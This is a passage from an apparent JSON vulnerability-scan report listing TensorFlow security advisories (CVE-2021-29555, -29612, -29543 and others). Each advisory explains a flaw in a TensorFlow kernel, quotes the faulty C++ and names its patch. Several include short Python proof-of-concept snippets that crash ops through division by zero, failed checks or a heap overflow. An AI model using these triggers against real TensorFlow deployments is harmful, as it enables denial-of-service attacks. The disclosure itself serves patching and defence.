                "text": "Vulnerability CVE-2021-29555\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29555](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29555)\n### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.FusedBatchNorm`:\n\n```python\nimport tensorflow as tf\n\nx = tf.constant([], shape=[1, 1, 1, 0], dtype=tf.float32)\nscale = tf.constant([], shape=[0], dtype=tf.float32)\noffset = tf.constant([], shape=[0], dtype=tf.float32)\nmean = tf.constant([], shape=[0], dtype=tf.float32)\nvariance = tf.constant([], shape=[0], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n\ntf.raw_ops.FusedBatchNorm(\n    x=x, scale=scale, offset=offset, mean=mean,\n    variance=variance, epsilon=epsilon,\n    exponential_avg_factor=exponential_avg_factor,\n    data_format=data_format, is_training=is_training)\n``` \n  \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/828f346274841fa7505f7020e88ca36c22e557ab/tensorflow/core/kernels/fused_batch_norm_op.cc#L295-L297) performs a division based on the last dimension of the `x` tensor:\n\n```cc \nconst int depth = x.dimension(3);\nconst int rest_size = size / depth;\n```\n\nSince this is controlled by the user, an attacker can trigger a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [1a2a87229d1d61e23a39373777c056161eb4084d](https://github.com/tensorflow/tensorflow/commit/1a2a87229d1d61e23a39373777c056161eb4084d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29555**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29555](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29555)|\n\n### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.FusedBatchNorm`:\n\n```python\nimport tensorflow as tf\n\nx = tf.constant([], shape=[1, 1, 1, 0], dtype=tf.float32)\nscale = tf.constant([], shape=[0], dtype=tf.float32)\noffset = tf.constant([], shape=[0], dtype=tf.float32)\nmean = tf.constant([], shape=[0], dtype=tf.float32)\nvariance = tf.constant([], shape=[0], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n\ntf.raw_ops.FusedBatchNorm(\n    x=x, scale=scale, offset=offset, mean=mean,\n    variance=variance, epsilon=epsilon,\n    exponential_avg_factor=exponential_avg_factor,\n    data_format=data_format, is_training=is_training)\n``` \n  \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/828f346274841fa7505f7020e88ca36c22e557ab/tensorflow/core/kernels/fused_batch_norm_op.cc#L295-L297) performs a division based on the last dimension of the `x` tensor:\n\n```cc \nconst int depth = x.dimension(3);\nconst int rest_size = size / depth;\n```\n\nSince this is controlled by the user, an attacker can trigger a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [1a2a87229d1d61e23a39373777c056161eb4084d](https://github.com/tensorflow/tensorflow/commit/1a2a87229d1d61e23a39373777c056161eb4084d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29612",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29612"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29612",
              "help": {
                "text": "Vulnerability CVE-2021-29612\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29612](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29612)\n### Impact\nAn attacker can trigger a heap buffer overflow in Eigen implementation of `tf.raw_ops.BandedTriangularSolve`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n  \nmatrix_array = np.array([])\nmatrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(0,1)),dtype=tf.float32)\nrhs_array = np.array([1,1])\nrhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(1,2)),dtype=tf.float32)\ntf.raw_ops.BandedTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/eccb7ec454e6617738554a255d77f08e60ee0808/tensorflow/core/kernels/linalg/banded_triangular_solve_op.cc#L269-L278) calls `ValidateInputTensors` for input validation but fails to validate that the two tensors are not empty:\n  \n```cc\nvoid ValidateInputTensors(OpKernelContext* ctx, const Tensor\u0026 in0, const Tensor\u0026 in1) {\n  OP_REQUIRES(\n      ctx, in0.dims() \u003e= 2, \n      errors::InvalidArgument(\"In[0] ndims must be \u003e= 2: \", in0.dims()));\n\n  OP_REQUIRES(\n      ctx, in1.dims() \u003e= 2,\n      errors::InvalidArgument(\"In[1] ndims must be \u003e= 2: \", in1.dims()));\n}\n``` \n\nFurthermore, since `OP_REQUIRES` macro only stops execution of current function after setting `ctx-\u003estatus()` to a non-OK value, callers of helper functions that use `OP_REQUIRES` must check value of `ctx-\u003estatus()` before continuing. This doesn`t happen [in this op`s implementation](https://github.com/tensorflow/tensorflow/blob/eccb7ec454e6617738554a255d77f08e60ee0808/tensorflow/core/kernels/linalg/banded_triangular_solve_op.cc#L219), hence the validation that is present is also not effective.\n\n### Patches\nWe have patched the issue in GitHub commit [ba6822bd7b7324ba201a28b2f278c29a98edbef2](https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2) followed by GitHub commit [0ab290774f91a23bebe30a358fde4e53ab4876a0](https://github.com/tensorflow/tensorflow/commit/0ab290774f91a23bebe30a358fde4e53ab4876a0).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29612**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29612](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29612)|\n\n### Impact\nAn attacker can trigger a heap buffer overflow in Eigen implementation of `tf.raw_ops.BandedTriangularSolve`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n  \nmatrix_array = np.array([])\nmatrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(0,1)),dtype=tf.float32)\nrhs_array = np.array([1,1])\nrhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(1,2)),dtype=tf.float32)\ntf.raw_ops.BandedTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/eccb7ec454e6617738554a255d77f08e60ee0808/tensorflow/core/kernels/linalg/banded_triangular_solve_op.cc#L269-L278) calls `ValidateInputTensors` for input validation but fails to validate that the two tensors are not empty:\n  \n```cc\nvoid ValidateInputTensors(OpKernelContext* ctx, const Tensor\u0026 in0, const Tensor\u0026 in1) {\n  OP_REQUIRES(\n      ctx, in0.dims() \u003e= 2, \n      errors::InvalidArgument(\"In[0] ndims must be \u003e= 2: \", in0.dims()));\n\n  OP_REQUIRES(\n      ctx, in1.dims() \u003e= 2,\n      errors::InvalidArgument(\"In[1] ndims must be \u003e= 2: \", in1.dims()));\n}\n``` \n\nFurthermore, since `OP_REQUIRES` macro only stops execution of current function after setting `ctx-\u003estatus()` to a non-OK value, callers of helper functions that use `OP_REQUIRES` must check value of `ctx-\u003estatus()` before continuing. This doesn`t happen [in this op`s implementation](https://github.com/tensorflow/tensorflow/blob/eccb7ec454e6617738554a255d77f08e60ee0808/tensorflow/core/kernels/linalg/banded_triangular_solve_op.cc#L219), hence the validation that is present is also not effective.\n\n### Patches\nWe have patched the issue in GitHub commit [ba6822bd7b7324ba201a28b2f278c29a98edbef2](https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2) followed by GitHub commit [0ab290774f91a23bebe30a358fde4e53ab4876a0](https://github.com/tensorflow/tensorflow/commit/0ab290774f91a23bebe30a358fde4e53ab4876a0).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "3.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29543",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29543"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29543",
              "help": {
                "text": "Vulnerability CVE-2021-29543\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29543](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29543)\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.CTCGreedyDecoder`:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[18, 2, 0], dtype=tf.float32)\nsequence_length = tf.constant([-100, 17], shape=[2], dtype=tf.int32)\nmerge_repeated = False\n\ntf.raw_ops.CTCGreedyDecoder(inputs=inputs, sequence_length=sequence_length, merge_repeated=merge_repeated)\n```\n  \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1615440b17b364b875eb06f43d087381f1460a65/tensorflow/core/kernels/ctc_decoder_ops.cc#L37-L50) has a `CHECK_LT` inserted to validate some invariants. When this condition is false, the program aborts, instead of returning a valid error to the user. This abnormal termination can be weaponized in denial of service attacks.\n\n### Patches \nWe have patched the issue in GitHub commit [ea3b43e98c32c97b35d52b4c66f9107452ca8fb2](https://github.com/tensorflow/tensorflow/commit/ea3b43e98c32c97b35d52b4c66f9107452ca8fb2).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n                      \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.        \n                      \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29543**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29543](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29543)|\n\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.CTCGreedyDecoder`:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[18, 2, 0], dtype=tf.float32)\nsequence_length = tf.constant([-100, 17], shape=[2], dtype=tf.int32)\nmerge_repeated = False\n\ntf.raw_ops.CTCGreedyDecoder(inputs=inputs, sequence_length=sequence_length, merge_repeated=merge_repeated)\n```\n  \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1615440b17b364b875eb06f43d087381f1460a65/tensorflow/core/kernels/ctc_decoder_ops.cc#L37-L50) has a `CHECK_LT` inserted to validate some invariants. When this condition is false, the program aborts, instead of returning a valid error to the user. This abnormal termination can be weaponized in denial of service attacks.\n\n### Patches \nWe have patched the issue in GitHub commit [ea3b43e98c32c97b35d52b4c66f9107452ca8fb2](https://github.com/tensorflow/tensorflow/commit/ea3b43e98c32c97b35d52b4c66f9107452ca8fb2).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n                      \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.        \n                      \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29590",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29590"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29590",
              "help": {
                "text": "Vulnerability CVE-2021-29590\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29590](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29590)\n### Impact\nThe implementations of the `Minimum` and `Maximum` TFLite operators can be used to read data outside of bounds of heap allocated objects, if any of the two input tensor arguments are empty.\n\nThis is because [the broadcasting implementation](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/internal/reference/maximum_minimum.h#L52-L56) indexes in both tensors with the same index but does not validate that the index is within bounds:\n\n```cc\nauto maxmin_func = [\u0026](int indexes[N]) {\n  output_data[SubscriptToIndex(output_desc, indexes)] =\n    op(input1_data[SubscriptToIndex(desc1, indexes)],\n        input2_data[SubscriptToIndex(desc2, indexes)]);\n};\n```\n\n### Patches\nWe have patched the issue in GitHub commit [953f28dca13c92839ba389c055587cfe6c723578](https://github.com/tensorflow/tensorflow/commit/953f28dca13c92839ba389c055587cfe6c723578).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29590**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29590](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29590)|\n\n### Impact\nThe implementations of the `Minimum` and `Maximum` TFLite operators can be used to read data outside of bounds of heap allocated objects, if any of the two input tensor arguments are empty.\n\nThis is because [the broadcasting implementation](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/internal/reference/maximum_minimum.h#L52-L56) indexes in both tensors with the same index but does not validate that the index is within bounds:\n\n```cc\nauto maxmin_func = [\u0026](int indexes[N]) {\n  output_data[SubscriptToIndex(output_desc, indexes)] =\n    op(input1_data[SubscriptToIndex(desc1, indexes)],\n        input2_data[SubscriptToIndex(desc2, indexes)]);\n};\n```\n\n### Patches\nWe have patched the issue in GitHub commit [953f28dca13c92839ba389c055587cfe6c723578](https://github.com/tensorflow/tensorflow/commit/953f28dca13c92839ba389c055587cfe6c723578).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29592",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29592"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29592",
              "help": {
                "text": "Vulnerability CVE-2021-29592\nSeverity: medium\nFixed Version: 2.4.2\nLink: [CVE-2021-29592](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29592)\n### Impact\nThe fix for [CVE-2020-15209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15209) missed the case when the target shape of `Reshape` operator is given by the elements of a 1-D tensor. As such, the [fix for the vulnerability](https://github.com/tensorflow/tensorflow/blob/9c1dc920d8ffb4893d6c9d27d1f039607b326743/tensorflow/lite/core/subgraph.cc#L1062-L1074) allowed passing a null-buffer-backed tensor with a 1D shape:\n\n```cc\nif (tensor-\u003edata.raw == nullptr \u0026\u0026 tensor-\u003ebytes \u003e 0) {\n  if (registration.builtin_code == kTfLiteBuiltinReshape \u0026\u0026 i == 1) {\n    // In general, having a tensor here with no buffer will be an error.\n    // However, for the reshape operator, the second input tensor is only\n    // used for the shape, not for the data. Thus, null buffer is ok.\n    continue;\n  } else {\n    // In all other cases, we need to return an error as otherwise we will\n    // trigger a null pointer dereference (likely).\n    ReportError(\"Input tensor %d lacks data\", tensor_index);\n    return kTfLiteError;\n  }\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f8378920345f4f4604202d4ab15ef64b2aceaa16](https://github.com/tensorflow/tensorflow/commit/f8378920345f4f4604202d4ab15ef64b2aceaa16).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29592**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.4.2|[CVE-2021-29592](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29592)|\n\n### Impact\nThe fix for [CVE-2020-15209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15209) missed the case when the target shape of `Reshape` operator is given by the elements of a 1-D tensor. As such, the [fix for the vulnerability](https://github.com/tensorflow/tensorflow/blob/9c1dc920d8ffb4893d6c9d27d1f039607b326743/tensorflow/lite/core/subgraph.cc#L1062-L1074) allowed passing a null-buffer-backed tensor with a 1D shape:\n\n```cc\nif (tensor-\u003edata.raw == nullptr \u0026\u0026 tensor-\u003ebytes \u003e 0) {\n  if (registration.builtin_code == kTfLiteBuiltinReshape \u0026\u0026 i == 1) {\n    // In general, having a tensor here with no buffer will be an error.\n    // However, for the reshape operator, the second input tensor is only\n    // used for the shape, not for the data. Thus, null buffer is ok.\n    continue;\n  } else {\n    // In all other cases, we need to return an error as otherwise we will\n    // trigger a null pointer dereference (likely).\n    ReportError(\"Input tensor %d lacks data\", tensor_index);\n    return kTfLiteError;\n  }\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f8378920345f4f4604202d4ab15ef64b2aceaa16](https://github.com/tensorflow/tensorflow/commit/f8378920345f4f4604202d4ab15ef64b2aceaa16).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "4.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-29552",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29552"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29552",
              "help": {
                "text": "Vulnerability CVE-2021-29552\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29552](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29552)\n### Impact\nAn attacker can cause a denial of service by controlling the values of `num_segments` tensor argument for `UnsortedSegmentJoin`:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], dtype=tf.string)\nsegment_ids = tf.constant([], dtype=tf.int32)\nnum_segments = tf.constant([], dtype=tf.int32)\nseparator = ``\n\ntf.raw_ops.UnsortedSegmentJoin(\n  inputs=inputs, segment_ids=segment_ids,\n  num_segments=num_segments, separator=separator)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/a2a607db15c7cd01d754d37e5448d72a13491bdb/tensorflow/core/kernels/unsorted_segment_join_op.cc#L92-L93) assumes that the `num_segments` tensor is a valid scalar:\n\n```cc\nconst Tensor\u0026 num_segments_tensor = context-\u003einput(2);\nauto num_segments = num_segments_tensor.scalar\u003cNUM_SEGMENTS_TYPE\u003e()();\n```\n\nSince the tensor is empty the `CHECK` involved in `.scalar\u003cT\u003e()()` that checks that the number of elements is exactly 1 will be invalidated and this would result in process termination.\n\n### Patches\nWe have patched the issue in GitHub commit [704866eabe03a9aeda044ec91a8d0c83fc1ebdbe](https://github.com/tensorflow/tensorflow/commit/704866eabe03a9aeda044ec91a8d0c83fc1ebdbe).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29552**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29552](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29552)|\n\n### Impact\nAn attacker can cause a denial of service by controlling the values of `num_segments` tensor argument for `UnsortedSegmentJoin`:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], dtype=tf.string)\nsegment_ids = tf.constant([], dtype=tf.int32)\nnum_segments = tf.constant([], dtype=tf.int32)\nseparator = ``\n\ntf.raw_ops.UnsortedSegmentJoin(\n  inputs=inputs, segment_ids=segment_ids,\n  num_segments=num_segments, separator=separator)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/a2a607db15c7cd01d754d37e5448d72a13491bdb/tensorflow/core/kernels/unsorted_segment_join_op.cc#L92-L93) assumes that the `num_segments` tensor is a valid scalar:\n\n```cc\nconst Tensor\u0026 num_segments_tensor = context-\u003einput(2);\nauto num_segments = num_segments_tensor.scalar\u003cNUM_SEGMENTS_TYPE\u003e()();\n```\n\nSince the tensor is empty the `CHECK` involved in `.scalar\u003cT\u003e()()` that checks that the number of elements is exactly 1 will be invalidated and this would result in process termination.\n\n### Patches\nWe have patched the issue in GitHub commit [704866eabe03a9aeda044ec91a8d0c83fc1ebdbe](https://github.com/tensorflow/tensorflow/commit/704866eabe03a9aeda044ec91a8d0c83fc1ebdbe).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29525",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29525"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29525",
              "help": {
                "text": "Vulnerability CVE-2021-29525\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29525](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29525)\n### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropInput`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([52, 1, 1, 5], shape=[4], dtype=tf.int32)\nfilter_tensor = tf.constant([], shape=[0, 1, 5, 0], dtype=tf.float32)\nout_backprop = tf.constant([], shape=[52, 1, 1, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropInput(input_sizes=input_tensor, filter=filter_tensor,\n                               out_backprop=out_backprop, strides=[1, 1, 1, 1],\n                               use_cudnn_on_gpu=True, padding=`SAME`,\n                               explicit_paddings=[], data_format=`NHWC`,\n                               dilations=[1, 1, 1, 1])\n```                 \n                    \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/b40060c9f697b044e3107917c797ba052f4506ab/tensorflow/core/kernels/conv_grad_input_ops.h#L625-L655) does a division by a quantity that is controlled by the caller:\n\n```cc \n  const size_t size_A = output_image_size * dims.out_depth; \n  const size_t size_B = filter_total_size * dims.out_depth;\n  const size_t size_C = output_image_size * filter_total_size;\n  const size_t work_unit_size = size_A + size_B + size_C;\n  ...\n  const size_t shard_size =\n      use_parallel_contraction ? 1 :\n      (target_working_set_size + work_unit_size - 1) / work_unit_size;\n```\n\n### Patches\nWe have patched the issue in GitHub commit [2be2cdf3a123e231b16f766aa0e27d56b4606535](https://github.com/tensorflow/tensorflow/commit/2be2cdf3a123e231b16f766aa0e27d56b4606535).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29525**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29525](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29525)|\n\n### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropInput`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([52, 1, 1, 5], shape=[4], dtype=tf.int32)\nfilter_tensor = tf.constant([], shape=[0, 1, 5, 0], dtype=tf.float32)\nout_backprop = tf.constant([], shape=[52, 1, 1, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropInput(input_sizes=input_tensor, filter=filter_tensor,\n                               out_backprop=out_backprop, strides=[1, 1, 1, 1],\n                               use_cudnn_on_gpu=True, padding=`SAME`,\n                               explicit_paddings=[], data_format=`NHWC`,\n                               dilations=[1, 1, 1, 1])\n```                 \n                    \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/b40060c9f697b044e3107917c797ba052f4506ab/tensorflow/core/kernels/conv_grad_input_ops.h#L625-L655) does a division by a quantity that is controlled by the caller:\n\n```cc \n  const size_t size_A = output_image_size * dims.out_depth; \n  const size_t size_B = filter_total_size * dims.out_depth;\n  const size_t size_C = output_image_size * filter_total_size;\n  const size_t work_unit_size = size_A + size_B + size_C;\n  ...\n  const size_t shard_size =\n      use_parallel_contraction ? 1 :\n      (target_working_set_size + work_unit_size - 1) / work_unit_size;\n```\n\n### Patches\nWe have patched the issue in GitHub commit [2be2cdf3a123e231b16f766aa0e27d56b4606535](https://github.com/tensorflow/tensorflow/commit/2be2cdf3a123e231b16f766aa0e27d56b4606535).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
